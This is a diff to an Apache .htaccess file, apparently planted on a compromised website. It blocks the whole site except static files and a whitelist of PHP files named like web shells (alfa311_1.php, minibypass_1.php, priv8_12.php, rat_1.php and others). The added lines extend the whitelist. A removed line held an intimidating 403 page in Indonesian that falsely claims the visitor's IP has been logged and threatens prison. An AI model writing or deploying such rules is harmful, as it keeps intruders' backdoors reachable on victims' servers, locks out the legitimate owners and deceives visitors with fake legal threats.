@@ -1,11 +1,10 @@
 Options -Indexes
 Deny from all
-<FilesMatch '(?i)\.(jpg|jpeg|png|gif|xml|doc|docs|docx|pdf|csv|xlsx|ico|webp|txt|mp4|mp3|3gp|css|js|eps|ai|JPEG|JPG|PNG|GIF|BMP|bmp|webp|WEBP|txt|eps)$'>
+<FilesMatch '(?i)\.(jpg|jpeg|png|gif|xml|doc|docs|docx|pdf|csv|xlsx|ico|webp|txt|mp4|mp3|3gp|css|js|eps|ai|JPEG|JPG|PNG|GIF|BMP|bmp|webp|WEBP|txt|eps|)$'>
     Order allow,deny
     Allow from all
 </FilesMatch>
-<FilesMatch '^(|admin_12.php|.bypas_cpn.php|bypas_cpn.php|super_kuat.php|ssilengkap.ShtMl|super_by.php|lock_lock21.php|minibypass_1.php|alfa311_1.php|priv8_12.php|css_13.php|db_354@.php|.minibypass_1.php|index.html|sitemap.xml|kuat354.PHP|kuat354.php|moli.php|minibypass_1.PHP|)$'>
+<FilesMatch '^(|baja_cpan.php|admin_cpn.php|rat_1.php|admin_12.php|bypas_cpn.php|bypas_cpn.php|super_kuat.php|ssilengkap.ShtMl|super_by.php|lock_lock21.php|minibypass_1.php|alfa311_1.php|priv8_12.php|css_13.php|db_354@.php|super_super.php|index.html|sitemap.xml|kuat354.PHP|kuat354.php|moli.php|Super-King.PHP|)$'>
     Order allow,deny
     Allow from all
 </FilesMatch>
-ErrorDocument 403 '<center><img src="https://i.ibb.co/L82gYwJ/Siber.png"></img> <h3>Sistem Sudah Mencatat Alamat IP Kamu dan Kami akan menindaklanjuti Tindakan illegal yang Anda lakukan.</h3><font>"Kami mendeteksi adanya tindak kejahatan yang Anda lakukan, Tindakan ini telah diatur oleh Pasal 30 ayat 1, ayat 2, dan atau ayat 3 UU No 11/2008 tentang Informasi dan Transaksi Elektronik (ITE) dengan hukuman 15 tahun penjara."</font><font color=black><br> Kami telah mencatat VPN IP ADRESS ANDA</font><font color=black> <br> User-Agent : <font color=red>%{HTTP_USER_AGENT}</font>'
